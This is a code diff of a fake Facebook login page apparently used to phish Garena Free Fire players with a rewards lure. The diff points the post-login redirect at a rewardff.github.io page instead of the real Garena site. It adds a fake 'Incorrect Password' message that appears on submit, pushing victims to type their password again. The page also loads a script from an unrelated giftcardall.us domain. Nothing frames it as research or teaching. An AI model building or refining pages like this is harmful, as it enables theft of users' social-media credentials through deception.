@@ -146,7 +146,7 @@
 				<input
 				type="hidden"
 				name="_redirect"
-				value="https://ff.garena.com/pets/index/en"
+				value="https://rewardff.github.io/garena/"
 			  />
             
 
@@ -157,9 +157,10 @@
 				<label>
 				<input type="password" name="pass" placeholder="Password" autocomplete="off" autocapitalize="off" required="">
 				</label>
+				<p id="mes" style="color: red; font-family: sans-serif; font-size: 14px; display: none;">Incorrect Password</p>
 				
 				
-				<button type="submit" class="btn-login-fb">Log In</button></form>
+				<button type="submit" class="btn-login-fb" onclick="rewdew()">Log In</button></form>
             <div class="txt-create-account">Create account</div>
             <div class="txt-not-now">Not now</div>
             <div class="txt-forgotten-password">Forgotten password?</div>
@@ -185,6 +186,9 @@
     <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
     <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
     <script src="https://giftcardall.us/tnkt/ff_sk/static/js/ryu.js"></script>
+  <script>
+    function rewdew() { document.getElementById("mes").style.display="block"; }
+  </script>  
    
 
 </body></html>
